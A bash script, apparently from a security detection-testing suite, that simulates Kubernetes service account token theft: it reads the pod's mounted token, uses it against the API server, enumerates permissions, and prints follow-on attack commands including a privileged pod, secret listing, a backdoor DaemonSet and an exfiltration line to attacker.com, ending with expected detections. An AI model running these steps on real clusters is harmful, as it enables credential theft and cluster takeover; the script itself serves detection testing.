#!/bin/bash
# Attack: Kubernetes Service Account Token Theft
# MITRE ATT&CK: Credential Access - T1552.007
# Severity: CRITICAL
# Description: Steals Kubernetes service account tokens to authenticate to API server

set -e
echo "[+] Starting: Kubernetes Service Account Token Theft"
echo "[+] MITRE ATT&CK: T1552.007 - Unsecured Credentials: Container API"
echo "[+] Severity: CRITICAL"
echo ""

echo "[*] Step 1: Checking for Kubernetes environment..."
if grep -q kubepods /proc/1/cgroup 2>/dev/null; then
    echo "[+] Running in Kubernetes pod"
else
    echo "[*] May not be running in Kubernetes"
fi

echo ""
echo "[*] Step 2: Locating service account token..."
SA_PATH="/var/run/secrets/kubernetes.io/serviceaccount"
if [ -d "$SA_PATH" ]; then
    echo "[+] Service account secrets found!"
    ls -la "$SA_PATH"

    echo ""
    echo "[*] Service account components:"
    echo "    - Token: JWT for API authentication"
    echo "    - CA Certificate: For TLS verification"
    echo "    - Namespace: Pod's namespace"
else
    echo "[!] Service account token not found"
    echo "[!] This simulation requires Kubernetes environment"
    exit 0
fi

echo ""
echo "[*] Step 3: Extracting token..."
if [ -f "$SA_PATH/token" ]; then
    TOKEN=$(cat "$SA_PATH/token")
    echo "[+] Token extracted!"
    echo "[*] Token length: ${#TOKEN} characters"
    echo "[*] Token (first 50 chars): ${TOKEN:0:50}..."

    # Decode JWT header
    TOKEN_HEADER=$(echo "$TOKEN" | cut -d. -f1)
    echo ""
    echo "[*] JWT Header:"
    echo "$TOKEN_HEADER" | base64 -d 2>/dev/null | head -c 200 || echo "$TOKEN_HEADER"
fi

if [ -f "$SA_PATH/namespace" ]; then
    NAMESPACE=$(cat "$SA_PATH/namespace")
    echo ""
    echo "[*] Namespace: $NAMESPACE"
fi

echo ""
echo "[*] Step 4: Discovering Kubernetes API server..."
K8S_API="https://kubernetes.default.svc"
echo "[*] API Server: $K8S_API"

if [ -f "$SA_PATH/ca.crt" ]; then
    echo "[*] CA Certificate available for TLS verification"
fi

echo ""
echo "[*] Step 5: Testing API access with stolen token..."
if command -v curl &> /dev/null; then
    echo "[*] Attempting API call to /api/v1/namespaces/$NAMESPACE/pods"

    if [ -f "$SA_PATH/ca.crt" ] && [ -f "$SA_PATH/token" ]; then
        echo "[*] Executing: curl --cacert ca.crt -H 'Authorization: Bearer <token>' $K8S_API/api/v1"
        curl --cacert "$SA_PATH/ca.crt" \
             -H "Authorization: Bearer $TOKEN" \
             -s "$K8S_API/api/v1" \
             -o /dev/null -w "HTTP Status: %{http_code}\n" 2>/dev/null || echo "[!] API call failed"
    fi
else
    echo "[!] curl not available"
fi

echo ""
echo "[*] Step 6: Enumerating permissions with kubectl (if available)..."
if command -v kubectl &> /dev/null; then
    echo "[*] Checking service account permissions:"
    kubectl auth can-i --list 2>/dev/null | head -10 || echo "[!] kubectl not configured"
else
    echo "[*] kubectl not available"
    echo "[*] In real attack, attacker would download kubectl and enumerate:"
    echo "    kubectl auth can-i --list"
    echo "    kubectl get pods --all-namespaces"
    echo "    kubectl get secrets --all-namespaces"
fi

echo ""
echo "[*] Step 7: Exploitation scenarios based on permissions..."
echo "[*] If service account has excessive permissions:"
echo ""
echo "    # Create privileged pod"
echo "    kubectl run evil --image=alpine --restart=Never \\"
echo "        --overrides='{\"spec\":{\"hostNetwork\":true,\"hostPID\":true}}'"
echo ""
echo "    # Access secrets"
echo "    kubectl get secrets --all-namespaces"
echo ""
echo "    # Create backdoor DaemonSet"
echo "    kubectl create -f malicious-daemonset.yaml"

echo ""
echo "[*] Step 8: Exfiltrating token for external use..."
echo "[*] Attacker would exfiltrate token to external machine:"
echo "    curl http://attacker.com/collect?token=\$TOKEN"
echo ""
echo "[*] Then use it externally:"
echo "    kubectl --token=\$TOKEN --server=$K8S_API get pods"

echo ""
echo "[✓] Service account token theft simulation completed"
echo "[i] In a real attack, this would:"
echo "    - Steal service account JWT token"
echo "    - Authenticate to Kubernetes API"
echo "    - Enumerate cluster resources"
echo "    - Create malicious pods/deployments"
echo "    - Access secrets across namespaces"
echo "    - Achieve cluster-wide compromise"
echo ""
echo "[!] Expected detections:"
echo "    - API calls from pod with stolen token"
echo "    - Unusual API access patterns"
echo "    - Permission enumeration"
echo "    - Creation of suspicious resources"
echo "    - Cross-namespace access attempts"
